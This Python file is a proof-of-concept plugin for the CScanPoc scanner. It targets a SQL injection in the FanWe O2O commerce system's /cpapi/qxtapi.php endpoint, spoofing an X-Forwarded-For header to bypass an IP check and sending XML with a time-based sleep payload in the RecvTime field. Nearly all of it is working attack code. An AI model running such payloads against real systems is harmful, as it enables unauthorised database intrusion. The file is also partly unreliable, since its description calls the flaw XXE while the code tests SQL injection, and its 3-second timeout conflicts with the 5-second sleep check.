# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import sys
import time


class Vuln(ABVuln):
    vuln_id = 'FanWe_0013'  # 平台漏洞编号，留空
    name = '方维O2O商业系统SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-03'  # 漏洞公布时间
    desc = '''
        /cpapi/qxtapi.php
        IP验证是可以用XFF绕过的，后面直接调用simplexml_load_string解析POST字符串，造成XXE实体注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3359/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FanWe(方维)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '42806532-849a-4be9-b950-d1ad603c2af1'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36',
                'X-FORWARDED-FOR': '221.179.180.156'
            }
            payloads = list('@abcdefghijklmnopqrstuvwxyz.0123456789')
            url = self.target + '/cpapi/qxtapi.php'
            data_sleep = "<aaaa><Body><Message><SrcMobile>0</SrcMobile><Content>123123</Content><RecvTime>0'|sleep(5)#</RecvTime></Message></Body></aaaa>"
            data_normal = "<aaaa><Body><Message><SrcMobile>0</SrcMobile><Content>123123</Content><RecvTime>0'|sleep(0)#</RecvTime></Message></Body></aaaa>"
            time_start = time.time()
            requests.post(url, data=data_normal, headers=headers, timeout=3)
            time_end_normal = time.time()
            requests.post(url, data=data_sleep, headers=headers, timeout=3)
            time_end_sleep = time.time()

            if (time_end_sleep-time_end_normal) - (time_end_normal-time_start) > 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
